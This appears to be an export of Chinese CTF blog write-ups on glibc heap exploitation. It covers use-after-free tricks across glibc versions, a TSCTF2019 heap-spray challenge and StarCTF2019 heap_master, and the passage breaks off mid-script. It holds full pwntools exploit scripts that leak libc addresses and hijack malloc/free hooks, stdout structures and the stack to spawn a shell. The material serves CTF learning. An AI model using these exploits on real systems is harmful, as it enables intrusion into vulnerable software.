[{"title":"各版本UAF专场","url":"/2021/08/18/各版本UAF专场/","content":"\n一般来说UAF都是比较好利用的，尤其是在有tcache的版本下，2.32之前，没有对fd做任何检查，也没有对size做任何检查，那么直接改fd就能想申请哪儿就申请哪儿。但是这里就面临地址的问题，所以高版本下的UAF常常不会给你Show函数，通常结合FSOP来爆破泄露地址。而低版本的，没有tcache的时候，不给show函数会更加困难，因为fastbin attack会检查size位，通常还需要伪造。\n\n这里就2.23~2.31版本的UAF做个总结利用，各个条件的缩减。\n\n▲首先给出自己为了方便调试写的题，存在UAF，堆溢出，后门，malloc和calloc切换等多个漏洞，参考note题目：\n\n \n\n# 一、Glibc2.23\n\n## 1.UAF + Leak + Size不做限制：\n\n这种情况直接free进unsortedbin泄露地址，然后打fastbin attack，借助0x7f字节错位劫持malloc_hook即可，没啥技术含量。这里再说一些，其实0x56也是可以的，可以借助unsortedbin attack将堆地址写到一个地方然后字节错位也是可以的。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-16_15-16-03.png)\n\n0x7f：0111 1**11**1\n\n0x56：0101 0**11**0\n\n主要看的是AM位，加粗的两位，不能刚好是10，检测：\n\n(1)是否属于当前线程的main_arena\n\n(2)是否是mmap出来的chunk的检测\n\n所以按照道理来讲，尾数为4 5 c d四个系列不能通过检测，其他都可以的。而对于堆地址的随机性，0x56和0x55都是可能的，所以也不一定成功，同样需要爆破。\n\n```\n#注释头\n\none_gadget = getOnegadget()\nadd_malloc(0x418,'PIG007NB')\nadd_malloc(0x68,'PIG007NB')\nfree(1)\nshow(1)\nlibc_base = u64Leakbase(88 + libc.sym['main_arena'])\nlg(\"libc_base\",libc_base)\nfree(2)\nedit(2,0x8,p64(libc_base + libc.sym['__malloc_hook']-0x23))\nadd_malloc(0x68,'PIG007NB')\n\nfor i in range(len(one_gadget)):\n    lg(\"one_gadget[\"+str(i)+\"]\",libc_base+one_gadget[i])\nadd_malloc(0x68,'\\x00'*0x13+p64(libc_base+one_gadget[]))\n#add_malloc(0x18,'PIG007NB')\np.sendline('1')\np.sendline('1')\np.sendline('1')\np.interactive()\n```\n\n需要注意的是这里由于覆写了_IO_wide_data部分数据，有些数据可能打印不出来，直接一股脑发送信息申请堆块即可。至于one_gadget没办法用的，参照realloc_hook调整栈帧。\n\n## 2.UAF + Leak + size限制\n\n▲比如说size限制不能申请0x70大小的堆块，那么就没办法字节错位申请malloc_hook的地方。一般来说有以下几种情况：\n\n(1)只能是小Chunk，即0x20~0x80：\n\n泄露heap地址，修改FD，指向上一个chunk来修改size，释放进入unsortedbin后泄露得到libc地址，之后再借用0x7f的UAF字节错位申请即可到malloc_hook即可。\n\n(2)只能是中等的chunk，大于fatsbin小于largebin的，即0x90~0x3f0。\n\n泄露地址后，直接用unsortedbin attack，修改global_max_fast，然后利用fastbinY链在main_arean上留下size，申请过去修改top_chunk为malloc_hook-0x10或者malloc_hook-0x28，修复unsortedbin之后即可任意修改。\n\n```\n#注释头\n\none_gadget = getOnegadget()\nmain_arena = libc.sym['main_arena']\nfastbinsY = main_arena + 8\ntarget_addr = main_arena + 80\nidx = (target_addr - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\n\n\nadd_malloc(size-0x8,'PIG007NB')\nadd_malloc(0x2f8,'PIG007NB')\nadd_malloc(size+0x10-0x8,'PIG007NB')\nadd_malloc(0xf8,'PIG007NB')\n\nfree(2)\nshow(2)\nlibc_base = u64Leakbase(unsortedBinIdx + libc.sym['main_arena'])\nlg(\"libc_base\",libc_base)\nmalloc_hook = libc_base + libc.sym['__malloc_hook']\nmain_arena = libc_base + libc.sym['main_arena']\ntarget_addr = libc_base+libc.sym['global_max_fast']\n\nedit(2,0x18,p64(0x0)+p64(target_addr-0x10))\nadd_malloc(0x2f8,'\\x00')\n\nfree(1)\nedit(1,0x8,p64(size+0x10+1))\nadd_malloc(size-0x8,'PIG007NB')\n\nfree(3)\nedit(3,0x8,p64(libc_base + libc.sym['main_arena'] + 0x48))\nadd_malloc(size+0x10-0x8,'PIG007NB')\nadd_malloc(size+0x10-0x8,p64(malloc_hook-0x28)+p64(0x0)+p64(main_arena+88)*2)\nadd_malloc(0x98,p64(0x0)*2+p64(libc_base + one_gadget[2])+p64(libc_base+libc.sym['realloc']+8))\np.sendline('1')\np.sendline('1')\np.sendline('1')\nit()\n```\n\n这里就利用realloc调整了一下栈帧\n\n(3)只能是大chunk，即0x400~...\n\n泄露地址后，直接用unsortedbin attack，修改global_max_fast，之后利用fastbinY机制可在free_hook附近伪造堆size，然后申请过去修改free_hook为system，释放堆块即可。\n\n```\n#注释头\n\nmain_arena = libc.sym['main_arena']\nfastbinsY = main_arena + 8\ntarget_addr_binsY = libc.sym['__free_hook']-0x10\nidx = (target_addr_binsY - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\n\n\nadd_malloc(0x4f8,\"\\xaa\"*0x4f8)\t\t#idx1\nadd_malloc(0x4f8,'/bin/sh\\x00')\t\t#idx2\n\nadd_malloc(size-0x8,'PIG007NB')\t\t#idx3\nadd_malloc(size+0x10-0x8,'PIG007NB')\t#idx4\n\nfree(1)\nshow(1)\nlibc_base = u64Leakbase(unsortedBinIdx + libc.sym['main_arena'])\nlg(\"libc_base\",libc_base)\n\ntarget_addr = libc_base+libc.sym['global_max_fast']\nlog.info(\"target_addr:0x%x\"%target_addr)\n#change unsortedBinchunkA\n#chunkA.fd could be anything\n\nedit(1,0x4f8,p64(0x0)+p64(target_addr-0x10)) \n#have to malloc all from unsortedbin\nadd_malloc(0x4f8,\"\\xaa\"*0x4f8)\t\t#idx4\nfree(3)\nedit(3,0x8,p64(size+0x10+1))\nadd_malloc(size-0x8,'PIG007NB')\nfree(4)\nedit(4,0x8,p64(libc_base + target_addr_binsY -0x8))\nadd_malloc(size+0x10-0x8,'PIG007NB')\nadd_malloc(size+0x10-0x8,p64(0x0)+p64(libc_base + libc.sym['system']))\nfree(2)\nit()\n```\n\n(4)只能是某个特定大小的chunk，比如只能是0x40，0x60，一般不会只能是一个大小的，不然基本无法利用。\n\n泄露地址heap地址后，修改size位进入unsortedbin中，再泄露libc地址。由于无法0x56和0x7f字节错位利用，所以只能利用一个size的bin，释放之后在fastbinY中留下size，然后另一个size申请过去，修改top_chunk到malloc_hook处即可，之后类似。\n\n详情参照CISCN东北赛区复现中的题目small_chunk。\n\n## 3.UAF + 无Leak + Size不做限制\n\n▲无Leak通常需要爆破，同样用unsortedbin attack部分写unsortedbin中chunk的bk指针，修改global_max_fast，之后利用fastbinY机制劫持_IO_2_1_stdout_结构体，泄露出地址，然后就和之前一样，再利用fastbinY机制劫持free_hook即可。\n\n```\n#注释头\n\ndef pwn():\n\t#one_gadget = getOnegadget()\n\theap_base = leak_heap()\n\tlibc_base = leak_libc() - libc.sym['printf']\n\telf_base = leak_elf() - elf.sym['main']\n\tlog.info(\"heap_base:0x%x\"%heap_base)\n\tlog.info(\"libc_base:0x%x\"%libc_base)\n\tlog.info(\"elf_base:0x%x\"%elf_base)\n\n\tadd_malloc(0x1000-0x8,'PIG007NB')\n\n\t#prepare data-----------------------------------------------------------\n\tguess_libc = 0x9000\n\tguess_heap = 0x2000\n\tfastbinsY = guess_libc + libc.sym['main_arena'] + 8\n\t_IO_read_end = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x10\n\t_IO_write_base = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x20\n\t_IO_write_ptr = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x28\n\t_IO_write_end = guess_libc + libc.sym['_IO_2_1_stdout_'] + 0x30\n\n\tidx_read_end = (_IO_read_end - fastbinsY) / 8\n\tsize_read_end = idx_read_end * 0x10 + 0x20\n\n\tidx_write_base = (_IO_write_base - fastbinsY) / 8\n\tsize_write_base = idx_write_base * 0x10 + 0x20\n\n\tidx_write_ptr = (_IO_write_ptr - fastbinsY) / 8\n\tsize_write_ptr = idx_write_ptr * 0x10 + 0x20\n\n\tidx_write_end = (_IO_write_end - fastbinsY) / 8\n\tsize_write_end = idx_write_end * 0x10 + 0x20\n\n\ttarget_addr_gMF = guess_libc + libc.sym['global_max_fast']\n\n\tfastbinsY = libc.sym['main_arena'] + 8\n\ttarget_addr_binsY = libc.sym['__free_hook']-0x10\n\tidx_free_hook = (target_addr_binsY - fastbinsY) / 8\n\tsize_free_hook = idx_free_hook * 0x10 + 0x20\n\n\t#read_end-------------------------------------------------------------\n\tadd_malloc(0x38,\"\\x00\"*0x38)\t\t\t\t#idx\t0x1\n\tadd_malloc(0x38,\"\\x00\"*0x38)\t\t\t\t#idx\t0x2  point free  read_end\n\tadd_malloc(0x38,\"\\x03\"*0x38)\t\t\t\t#idx\t0x3\n\tadd_malloc(0x38,'\\x04'*0x18+p64(0x21)+'\\x04'*0x18)\t\t#idx\t0x4\n\n\tfree(0x1)\n\t#free(2)\n\tfree(0x3)\n\tedit(0x3,0x1,'\\x20')\n\tedit(0x1,0x20,p64(0x0)*3+p64(0x41))\n\n\tadd_malloc(0x38,'\\x05'*0x18+p64(0x21)+'\\x05'*0x18)\t\t\t\t#idx\t0x5\n\tadd_malloc(0x38,'\\x06'*0x18)\t\t\t\t\t\t\t\t\t#idx\t0x6 #point change size\n\t#---------------------------------------------------------------------\n\n\n\t#write_end can not be so far from wirte_base\n\tadd_malloc(size_write_end-0x8,(p64(0x0)+p64(0x21))*((size_write_end-0x10)/0x10))\t\t\t\t#idx\t0x7\n\tadd_malloc(size_write_ptr-0x8,(p64(0x0)+p64(0x21))*((size_write_ptr-0x10)/0x10))\t\t\t\t#idx\t0x8\n\n\n\t#write_base-----------------------------------------------------------\n\tadd_malloc(0x38,\"\\x00\"*0x38)\t\t\t\t#idx\t0x9\n\tadd_malloc(0x38,\"\\xaa\"*0x38)\t\t\t\t#idx\t0xa\n\tadd_malloc(0x38,\"\\x0b\"*0x38)\t\t\t\t#idx\t0xb\n\tadd_malloc(0x38,'\\x0c'*0x18+p64(0x21)+'\\xaa'*0x18)\t\t#idx\t0xc\n\n\tfree(0x9)\n\t#free(2)\n\tfree(0xb)\n\tedit(0xb,0x2,p16((guess_heap+0x1000+0x40)&0xffff))\n\tedit(0x9,0x20,p64(0x0)*3+p64(0x41))\n\n\tadd_malloc(0x38,'\\x0d'*0x18+p64(0x21)+'\\x05'*0x18)\t\t\t\t#idx\t0xd\n\tadd_malloc(0x38,'\\x0e'*0x18)\t\t\t\t\t\t\t\t\t#idx\t0xe #point free\n\t#---------------------------------------------------------------------\n\n\n\n\t#prepare for free_hook\n\tadd_malloc(size_free_hook-0x8,'PIG007NB')\t\t\t#idxf\n\tadd_malloc(size_free_hook+0x10-0x8,'PIG007NB')\t\t#idx10\n\n\n\t#unsortedbin attack\n\tadd_malloc(0x4f8,'\\x11'*0x4f8)\t\t\t#idx 0x11\n\tadd_malloc(0x38,'\\x12'*0x38)\t\t\t#idx 0x12\n\tfree(0x11)\n\tedit(0x11,0x8+0x2,p64(0x0)+p16((target_addr_gMF&0xffff)-0x10))\n\tadd_malloc(0x4f8,'/bin/sh\\x00')\t\t\t#idx 0x13\n\n\n\n\t#change write_base \n\tedit_m(0x6,0x20,p64(0x0)*3+p64(size_write_base+1))\n\tfree_m(0xe)\n\n\n\t#change write_end and write_ptr\n\tfree_m(0x7)\n\tfree_m(0x8)\n\n\n\t#change read_end\n\tedit_m(0x6,0x20,p64(0x0)*3+p64(size_read_end+1))\n\tfree_m(0x2)\n\n\tlibc_base = u64Leakbase(libc.sym['_IO_2_1_stdout_']+131)\n\tlg(\"libc_base\",libc_base)\n\n\t#write free_hook - 0x10\n\tfree(0xf)\n\n\t#left size\n\tedit(0xf,0x8,p64(size_free_hook+0x10+1))\n\tadd_malloc(size_free_hook-0x8,'PIG007NB')\n\n\t#get free_hook - 0x8\n\tfree(0x10)\n\tedit(0x10,0x8,p64(libc_base + target_addr_binsY -0x8))\n\tadd_malloc(size_free_hook+0x10-0x8,'PIG007NB')\n\tadd_malloc(size_free_hook+0x10-0x8,p64(0x0)+p64(libc_base + libc.sym['system']))\n\n\t#get shell\n\tfree(0x13)\n\tit()\n\n\n\n\n\ni = 0\nwhile True:\n\ti = i + 1\n\ttry:\n\t\tp = process(\"./note\")\n\t\tlg(\"Times:\",i)\n\t\tpwn()\n\texcept EOFError:\n\t\tp.close()\n\t\tcontinue\n\telse:\n\t\tp.interactive()\n\t\tbreak\n```\n\n▲通常需要注意的是，write_base和write_end不能相距太远，不然很容易数据量过大而崩溃。还有这里最后泄露地址是\n\nlibc_base = u64Leakbase(libc.sym['_IO_2_1_stdout_']+131)\n\n这是因为IO流的机制，会在写入数据的0x10处上写下libc.sym['_IO_2_1_stdout_']+131的地址，所以这里直接就能泄露。\n\n▲题外话：爆破的数学期望为1/256\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-17_18-07-31.png)\n\n## 4.UAF + 无Leak + Size做限制\n\n▲同样size做限制一般也分为以下几种\n\n(1)只能是小Chunk，即0x20~0x80：\n\n这个也是一样的，利用UAF部分写入heap_addr制造堆块重叠，修改size域，放入unsortedbin，然后部分写入libc_addr打unsortedbin attack修改global_max_fast，之后就类似了，劫持_IO_2_1_stdout泄露地址，fastbinY机制劫持main_arena，修复unsortedbin后改top_chunk劫持malloc_hook即可。\n\n(2)只能是中等的chunk，大于fatsbin小于largebin的，即0x90~0x3f0。\n\n类似，部分写修改size域打unsortedbin attack，修改global_max_fast，劫持_IO_2_1_stdout泄露地址。fastbinY机制劫持free_hook。\n\n(3)只能是大chunk，即0x400~...\n\n直接用部分写libc_addr打unsortedbin attack，修改global_max_fast，劫持_IO_2_1_stdout泄露地址，之后利用fastbinY机制可在free_hook附近伪造堆size，然后申请过去修改free_hook为system，释放堆块即可。\n\n(4)指定的chunk size。\n\n▲其实对于UAF来说，size做没做限制都差不了太多，因为都可以部分写堆块地址制造堆重叠，然后就能修改size域，唯一区分的就是申请时候的限制，小的就打top_chunk，大的就直接打_free_hook。比较有意思的一点就是限制特定size，一般限制为两个，以前遇到0x20和0x30，也有0x40和0x50的，都是大同小异，借用fastbinY机制留下size后申请过去即可。\n\n \n\n# 二、Glibc2.27\n\nUAF在这个版本下对于tcache实在是好用，再加上传统的unsortedbin attck还没有失效，分分钟就能出来，不讲了。\n\n \n\n# 三、Glibc2.29\n\n这个版本下的unsortedbin attck已经失效，原因是","categories":["pwn堆-UAF"]},{"title":"TSCTF2019 薛定谔的堆块-HeapSpray","url":"/2021/08/18/TSCTF2019 薛定谔的堆块-HeapSpray/","content":"\nheapspray有很多的应用场景，但大多都是windows下的漏洞应用，关于Glibc的比较少，至今只看见两题：\n\n[pwnhub.cn 故事的开始 calc](https://atum.li/2016/12/05/calc/)\n\n[TSCTF2019 薛定谔的堆块](https://www.anquanke.com/post/id/206484)\n\n这里参考第二篇文章针对第二题做个复现，理解下堆喷的思想。\n\n1.函数理解，这里分析起来比较麻烦，最好就调试，直接给出相关的功能：\n\n(1)Create函数：\n\n①创建chunk，但每次Create会创建0x10个相同大小的chunk，且大小为输入size+4。比如输入size为0xc，那么创建的chunk就是0x10个0x18大小的Chunk。同时每0x10个小chunk在宏观意义上组成一个大chunk，这里用SmallChunk和BigChunk区分一下。\n\n②chunk的索引在全局数组dword_4060，chunkList中随机排列，比如idx为0的chunk不一定是第一个创建的。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-46-26.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-49-21.png)\n\n这点在后面堆喷会用到，无法简单地通过打印值来判断heap地址，只能判断出在哪个BigChunk中，还得判断出某个SmallChunk在BigChunk中的位置才能泄露出堆地址。\n\n③创建chunk读取数据时read_str函数里有\\x00截断，所以Display在没有UAF的情况下难以泄露出地址，这里也不存在堆溢出。\n\n④选择chunk类型时会给chunk_addr+size处赋值，这里就是之前申请size+4的原因。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-56-19.png)\n\n这个赋予的值是一个ELF上的data数据地址，没啥用，迷惑用的，同时如果选择的选项不为1-4的话，就会不赋值，这个在后面很有用。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_21-58-56.png)\n\n(2)Display函数：\n\n比较常规，输出给定index范围的SmallChunk的内容\n\n(3)Delete函数：\n\n删除最后一次Create的BigChunk的所有SmallChunk，free数据且置指针NULL，没啥漏洞。但是这里删除是依据chunkList的顺序索引删除，而chunkList又是被打乱的，所以删除之后的顺序其实不是我们最开始输入数据的顺序，这个在后面unsortedbin泄露数据的时候需要注意一下。\n\n(4)Modify函数：\n\n编辑指定index的Small Block的内容，这里没啥用\n\n(5)CallFunction函数：\n\n根据Create时的最后那4byte的数值来决定执不执行某个函数指针(这个函数指针就是最开始创建的时候赋值的ELF上的数据)。\n\n①*(chunk_addr+size) != 0，则set *(*(chunk_addr+size)) -= 1\n\n②*(chunk_addr+size) == 0，则jmp *(*(chunk_addr+size))+0x4\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_23-06-41.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_23-07-14.png)\n\n这里调用CallFunction函数之后就可以调用到0xf7e87401，这里的*0x57d1ab8c是我们在堆上设置好的内容。\n\n2.漏洞发现：\n\n这里就结合Create函数，利用先申请填充内容之后再释放，使得*(chunk_addr+size)可控，从而能够调用任意函数。但是在保护全开的情况下想要调用函数，必须需要泄露地址，而地址在没有漏洞的情况下又没办法泄露。\n\n堆喷原理：https://www.cnblogs.com/Fang3s/articles/3911561.html\n\n(1)堆喷结合CallFunction函数的-1泄露地址：\n\n假设某个堆地址：magic_addr。由于这里可以Display，所以如果*magic_addr= magic_addr-1，而利用堆喷使得一定范围内的堆内容都为magic_addr，打印内容之后，就可以依据打印的内容，能够从中筛选出magic_addr，获取其索引，再经过我们制造堆喷过程中运算就能得到开始堆喷的地址start_addr。\n\n比如：magic_addr = 0x58585858，申请了0x100个0x20000大小的Chunk，那么得到索引为0x58，且magic_addr 也是一个0x20000的chunk，就可求得start_addr为0x58585858-0x58*0x20000。当然这是理论上的，实际还得一系列的判断运算。\n\n同理，在当我们释放堆块进入unsortedbin之后，踩下main_arena地址再申请回来，由于\\x00截断很难泄露出地址，这里也是采用这个方法，使得\\x00-1成为0xff来把\\x00截断给抹杀。\n\n(2)有了地址之后就可调用libc上任意的函数了，这里的one_gadget都用不了，在没办法往栈上输入数据的情况下就需要栈劫持了，这里找两个gadget，原题给的是：\n\n```python\n#注释头\n\nmagic_gadget1 = 0x00161871# 0x00161871 : xchg eax, ecx ; cld ; call dword ptr[eax]\nmagic_gadget2 = 0x00072e1a# 0x00072e1a : xchg eax, esp ; sal bh, 0xd8 ;\n```\n\n我用我自己编译的Libc是：\n\n```python\n#注释头\n\nmagic_gadget1 = 0x00164401# 0x00161871 : xchg eax, ecx ; cli ; jmp dword ptr[eax]\nmagic_gadget2 = 0x00073c10+0x3a# 0x00072e1a : xchg eax, esp ; sal bh, 0xd8 ;\n```\n\n一样的，没啥区别，得自己找去。ROPgadget。\n\n在调用jmp *(*(chunk_addr+size))+0x4时，看到context为\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-10_23-38-18.png)\n\n这里的ecx就保存这一个堆地址，那么我们就利用ecx和eax结合这两个gdaget来进行栈劫持，从而getshell。\n\n3.exp编写：\n\n(1)堆喷堆布局，填充数据在堆上，满足*magic_addr=magic_addr，且其他chunk的所有数据也为magic_addr\n\n```python\n#注释头\n\n#----------------------------------------\n#fill 0x58 to all chunk\ndata = []\nfor i in range(0x10):\n    data.append(['X' * (0x20000 - 1), 1])\nmalloc(0x20000, data)\ndelete()\n\nfor i in range(0x10):\n    malloc(0x20000, data)\n\n#idx 0x0->0x100-1\n#----------------------------------------\n```\n\n(2)填充需要触发的chunk数据，满足*chunk_addr + size = magic_addr，然后调用callfuc函数使得*magic_addr= magic_addr-1，打印数据之后即可判断。\n\n```python\n#-----------------------------------------------\n#fill 0x1000 all 0x58 (idx 0x100->0x110-1)\ndata = []\nfor i in range(0x10):\n    data.append(['X' * (0x1000 - 1), 1])\nmalloc(0x1000, data)\ndelete()\n\n\ndata = []\nfor i in range(0x10):\n    data.append(['X' * (0xf0 - 1), 0])\nmalloc(0xf0, data)\n#idx 0x100->0x110-1\n\n\n#0x100->0x110-1 OK\ncallfuc(0x100)\nshow(0, 0x100)\n#-----------------------------------------------\n```\n\n(3)判断chunk基于的BigChunk索引：\n\n```python\n#注释头\n\nindex = 0\noffest = 0\nout = ''\nmagic_addr = 0x58585858\nfor i in range(0x100):\n    out = p.recvline()\n    if 'W' in out:\n        index = i\n        break\nout = out[12 : ]\noffest = out.index('W')\n\nlog.info('magic_addr is : %d' % index)\nlog.info('offest is : %d' % offest)\nlog.info('start addr is : ' + hex(magic_addr- offest))\nblock_start = (index / 0x10) * 0x10\n```\n\n(4)计算chunk在BigChunk中的位置：\n\n```python\n#注释头\n\ndelete()\ncount = 1\np_index = 0\nwhile 1:\n    log.info(\"start find prev block count = %d\" % count)\n    data = []\n    for i in range(0x10):\n        data.append([p32(magic_addr - 0x20008 * count) * (0x1000 / 4 - 1),\n1])\n    malloc(0x1000, data)\n    delete()\n\n    data = []\n    for i in range(0x10):\n        data.append(['X' * (0xa0 - 1), 0])\n    malloc(0xa0, data)\n\n    log.info(\"start call fuc count = %d\" % count)\n    callfuc(0x100)\n    show(block_start - 0x10, index + 1)\n    p_index = 0\n    out = ''\n    for i in range(index + 1 - block_start + 0x10):\n        out = p.recvline()\n        if 'W' in out:\n            p_index = i + block_start - 0x10\n            break\n    delete()\n    if p_index < block_start:\n        break\n    count += 1\n\n\nlog.info('block start is : %d' % block_start)\nlog.info('p_index is : %d' % p_index)\nheap_start_addr = magic_addr - 0x20008 * (count - 1 + 0x10 * (block_start / 0x10)) - offest - 8\nlog.info('heap start is : ' + hex(heap_start_addr))\n```\n\n同样的方法，依据地址顺序遍历BigChunk中的0x1-0x10的所有可能范围，对于修改*chunk_addr= magic_addr-1，然后打印判断得到各个索引对应的地址。由于创建的时候是random函数，所以也可以用爆破的方式解决，概率为1/16。\n\n(5)获取libc地址，方法是释放之后使之进入unsortedbin踩下地址，利用callfuc函数和字节错位的方法对抗\\x00截断从而泄露出地址：\n\n```python\n#注释头\n\nfor i in range(0x10):\n    delete()\n\ndata = []\nfor i in range(0x10):\n    data.append([p32(heap_start_addr + 8 + 3 ) * (0x1000 / 4 - 1), 1])\nmalloc(0x1000, data)\ndelete()\n\ndata = []\nfor i in range(0x10):\n    data.append(['aaa', 0])\nmalloc(0xa0, data)\ncallfuc(0)\nshow(0, 0x10)\nfor i in range(index + 1 - block_start + 0x10):\n    out = p.recvline()\n    out = out[12 : -1]\n    if 'aaa' != out:\n        libc_addr = u32(out[4 : 8]) + 1 - 0x1b07b0\n        break\nlog.info('libc addr is : ' + hex(libc_addr))\ndelete()\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1-1.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2-1.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs3.png)\n\n这里的main_arena变化是因为0xedb7ab000变为了0xedb7afff，导致字节错位变化的，具体调试一下就知道\n\n(6)劫持栈，结合gadget来getshell。\n\n```python\n#注释头\n\nmagic_gadget1 = 0x00164401       \n#xchg eax, ecx ; cli ; jmp dword ptr[eax] \nmagic_gadget2 = 0x00073c10+0x3a  \n#xchg eax, esp ; sal bh, 0xd8 ;\nsystem_offest = 0x3adb0\nbinsh_addr = 0x15bb0b\n# gdb.attach(p)\n\ndata = []\nfor i in range(0x10):\n    data.append([p32(heap_start_addr + 12) * (0x1000 / 4 - 1), 1])\nmalloc(0x1000, data)\ndelete()\n\ndata = []\nfor i in range(0x10):\n    data.append([(p32(libc_addr + magic_gadget2) + p32(0) + p32(libc_addr\n+ magic_gadget1) + p32(0) * 4 + p32(libc_addr + system_offest) + p32(0) +\np32(libc_addr + binsh_addr)).ljust(0xa0 -1, '\\x00'), 0])\nmalloc(0xa0, data)\ncallfuc(0)\np.interactive()\n```\n\n这里关于最后堆上数据的布局需要调试才能知道，建议先随便写几个，然后调试的时候在写数据。\n\n▲题外话：这里其实并没有用到常规意义上的通过堆喷滑板0x0c，0x58之类的滑板指令来执行shellcode或者ROP，所以其实这里的magic_addr换成0x57575757，0x56565656也是一样可以的，只不过成功率可能会小不少，毕竟这里还最开始申请了一个随机大小的堆块，而且PIE堆的随机化程度也大多在0x56到0x58之间。\n\n4.总结：\n\n(1)堆喷思想：其实就是多级指针的思想，通过劫持指针来滑动程序流或者泄露地址。\n\n(2)调试：汇编指令一定要熟悉，像劫持栈常用的xchg eax,esp等。\n\n \n\n ","tags":["Heap-spray"],"categories":["pwn堆-spray"]},{"title":"StarCTF2019_heap_master","url":"/2021/08/14/StarCTF2019_heap_master/","content":"\n这道题学到了很多，特此记录一下。\n\n# 1.常规checksec一下，保护全开。\n\n# 2.函数解析：\n\n比较常规的菜单题，这里的add是正常，但是程序最开始mmap一块0x10000大小的chunk，之后的edit和delete都是针对这个最开始mmap出来的chunk。\n\n(1)edit函数：输入偏移，针对m_chunk_addr对应偏移修改。比如m_chunk_addr=0x100，偏移为0x10，修改内容为'M'那么修改内容为*(0x100+0x10) = 'M'，即*(m_chunk_addr+offset) = change_cont。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs1-2.png)\n\n(2)delete函数：同样输入偏移针对m_chunk_addr对应偏移free，由于没有指针的相关操作，所以这里存在UAF。\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs2-2.png)\n\n# 3.漏洞解析：\n\n(1)由于mmap的数据可以任意伪造和释放，那么我们可以利用这个释放任意大小chunk，在没有办法泄露地址的情况下，我们可以选择进行爆破global_max_fast，利用unsortedbin attack在global_max_fast上写下main_arena地址，使得fastbinY数组可以越界写。\n\n(2)之后再利用释放任意大小的chunk，从main_arena中fastbinY数组越界往后写，修改_IO_2_1_stout结构体的_IO_write_base、_IO_write_ptr、_IO_read_end、_IO_write_end为mmap中放入unsortedbin的堆地址，从而泄露出main_arena地址得到地址。\n\n(3)再利用fastbin的特性，修改fastbinY数组上的chunk的fd为system，申请对应大小的fastbin回来之后，其fd就留在fastbinY数组上，这样如果fastbinY对应的那个索引chunk本身就在free_hook上，那么就可以修改free_hook为system了。这个同样通过fastbinY数组越界写来实现。\n\n(4)最后释放一个/bin/sh堆块即可getshell。\n\n# 4.exp编写与调试：\n\n(1)首先是菜单函数：\n\n```python\n#注释头\n\ndef dbg():\n    gdb.attach(io)\n    pause()\n    \n\ndef add(size):\n    io.sendlineafter(\">> \", \"1\")\n    sleep(0.01)\n    io.sendlineafter(\"size: \", str(size))\n    sleep(0.01)\n\ndef edit(offset, cont):\n    io.sendlineafter(\">> \", \"2\")\n    sleep(0.01)\n    io.sendlineafter(\"offset: \", str(offset))\n    sleep(0.01)\n    io.sendlineafter(\"size: \", str(len(cont)))\n    sleep(0.01)\n    io.sendafter(\"content: \", cont)\n    sleep(0.01)\n\ndef m_edit(offset, cont):\n    io.sendline(\"2\")\n    sleep(0.01)\n    io.sendline(str(offset))\n    sleep(0.01)\n    io.sendline(str(len(cont)))\n    sleep(0.01)\n    io.send(cont)\n    sleep(0.01)\n\ndef delete(offset):\n    io.sendlineafter(\">> \", \"3\")\n    sleep(0.01)\n    io.sendlineafter(\"offset: \", str(offset))\n    sleep(0.01)\n\ndef m_delete(offset):\n    io.sendline(\"3\")\n    sleep(0.01)\n    io.sendline(str(offset))\n    sleep(0.01)\n```\n\n这里切分m_delete和m_edit的原因是因为在后面第一次修改_IO_write_base之后输出的东西可能就会发生一些变化，不太好接着判断。\n\n(2)修改global_max_fast：\n\n```python\n#注释头\n\nedit(0,p64(0x0)+p64(0x91)+\n    '0'*0x80+\n    p64(0x0)+p64(0x21)+\n    '1'*0x10+\n    p64(0x0)+p64(0x21))\ndelete(0x10)\nguess = 0x9000\nedit(0x18, p16((guess + libc.sym['global_max_fast'] - 0x10) & 0xffff))\nadd(0x80)\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsSnipaste_2021-08-11_14-40-07.png)\n\n(3)fastbinY数组越界写，泄露得到地址：\n\n```python\n#注释头\n\nfastbinsY = guess + libc.sym['main_arena'] + 8\n_IO_read_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x10\n_IO_write_base = guess + libc.sym['_IO_2_1_stdout_'] + 0x20\n_IO_write_ptr = guess + libc.sym['_IO_2_1_stdout_'] + 0x28\n_IO_write_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x30\n\n\n\n# overwrite _IO_2_1_stdout_._IO_write_base\nidx = (_IO_write_base - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nm_edit(0x10 + 0x8, p64(size+1))\nm_edit(0x10 + size, p64(0x0)+p64(0x21))\nm_delete(0x10 + 0x10)\n\n\n# overwrite _IO_2_1_stdout_._IO_write_ptr\nidx = (_IO_write_ptr - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nm_edit(0x10 + 0x8 + 0x10, p64(size+1))\nm_edit(0x10 + size + 0x10, p64(0x0)+p64(0x21))\nm_delete(0x10 + 0x10 + 0x10)\n\n\n# overwrite _IO_2_1_stdout_._IO_write_end\nidx = (_IO_write_end - fastbinsY) / 8\nsize = idx * 0x10 + 0x20\nm_edit(0x10 + 